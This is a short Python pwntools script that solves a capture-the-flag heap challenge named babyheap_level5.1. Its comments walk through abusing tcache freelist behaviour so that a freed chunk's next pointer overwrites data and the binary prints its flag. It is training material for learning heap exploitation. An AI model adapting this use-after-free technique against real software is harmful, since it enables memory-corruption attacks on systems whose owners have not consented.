from pwn import *

with process("/challenge/babyheap_level5.1") as p:
    p.sendline(b"malloc")
    p.sendline(b"0")
    p.sendline(b"680") # *ptr -> data

    p.sendline(b"malloc")
    p.sendline(b"1")
    p.sendline(b"680")

    p.sendline(b"free")
    p.sendline(b"1") # tchunk [ *ptr ] ; also remember tcache is LIFO

    p.sendline(b"free")
    p.sendline(b"0") # thunk [ *ptr, *ptr_1 ] so now *ptr->next will point to *ptr_1 and thus it is != NULL

    p.sendline(b"read_flag") # from tchunk [ *ptr ] then *ptr[0] = 0, *ptr[2] = flag
    p.sendline(b"free")  # back to tchunk [ *ptr ] where *ptr[0] = *ptr->next (freed chunk)
    p.sendline(b"0")

    p.sendline(b"puts_flag") # since *ptr->next overwrote *ptr[0] in tchunk
    print(p.clean())
